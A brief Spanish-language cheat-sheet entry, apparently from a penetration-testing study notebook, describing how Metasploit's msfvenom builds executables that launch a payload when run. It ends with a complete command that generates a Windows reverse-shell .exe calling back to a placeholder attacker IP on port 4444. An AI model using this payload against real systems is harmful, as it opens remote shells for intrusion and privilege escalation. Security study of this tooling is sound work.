# msfvenom

MSFVenom es una herramienta, dentro del framework de Metasploit, que nos permite generar archivos con payloads dentro. Es decir, en lugar de incluir el payload en un exploit, como haríamos con la herramienta msfconsola, el objetivo aquí es crear un "malware" que al ejecutarlo lance el payload.

Este tipo de malware nos puede permitir escalar privilegios.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o reverse.exe`

